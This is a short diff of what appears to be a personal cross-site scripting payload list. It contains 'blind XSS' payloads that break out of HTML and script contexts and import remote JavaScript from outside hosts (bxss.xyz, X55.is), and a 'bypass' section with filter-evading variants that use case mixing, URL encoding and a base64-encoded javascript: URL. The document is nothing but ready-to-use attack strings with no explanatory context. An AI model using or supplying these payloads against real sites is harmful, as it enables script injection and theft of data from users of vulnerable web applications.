@@ -1,9 +1,10 @@
 My blind xss payload: '"></script/x><img/src/onerror=import('//bxss.xyz/')//
 '"></script/x><img/src/onerror=import('https://bxss.xyz/');//
 '"></script/x><img/src/onerror=import('//bxss.xyz/');//
-"><Img Src=//X55.is OnLoad%0C=import(src)>
+
 XSS Bypass:
 
+"><Img Src=//X55.is OnLoad%0C=import(src)>
 "><img src=1 only onerror=alert()>
 "><svg%2FONxss%3D'0'%2FONload%3Dlocation%3Dwindow[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ%3D%3D`%3B%2F%2F
 "><svg/ONxss='0'/ONload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;//
